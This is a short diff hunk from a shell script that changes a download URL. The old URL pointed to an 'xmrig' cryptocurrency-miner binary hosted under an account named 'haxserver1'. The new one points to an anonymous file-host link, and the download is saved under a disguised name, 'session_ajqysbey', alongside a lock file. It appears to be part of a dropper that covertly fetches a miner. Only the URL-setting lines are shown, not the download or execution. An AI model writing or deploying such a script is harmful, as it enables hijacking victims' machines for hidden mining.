@@ -7,7 +7,7 @@ error_exit() {
 }
 
 # Set the URL to download from
-URL="https://github.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/raw/main/xmrig"
+URL="https://oshi.at/ghig"
 # Set the desired file name
 FILENAME="session_ajqysbey"
 # Lock file
